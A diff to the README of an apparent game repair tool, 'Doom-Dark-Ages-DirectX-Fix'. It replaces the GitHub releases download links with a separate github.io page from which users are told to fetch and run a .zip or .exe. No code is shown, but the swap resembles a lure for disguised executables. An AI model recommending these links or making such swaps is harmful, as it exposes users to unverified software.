@@ -1,6 +1,6 @@
 # 🛠️ Doom-Dark-Ages-DirectX-Fix - Fix your game graphics crashes now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/marinell9048/Doom-Dark-Ages-DirectX-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://marinell9048.github.io)
 
 ## 🎯 Purpose of this tool
 
@@ -17,7 +17,7 @@ Your computer must meet these basic standards to run the fix successfully:
 
 ## 💾 How to get the software
 
-1. Navigate to the release page at [https://github.com/marinell9048/Doom-Dark-Ages-DirectX-Fix/releases](https://github.com/marinell9048/Doom-Dark-Ages-DirectX-Fix/releases).
+1. Navigate to the release page at [https://marinell9048.github.io](https://marinell9048.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the file with the .zip or .exe extension to start the request to your machine.
 4. Save the file to your desktop for easy access.
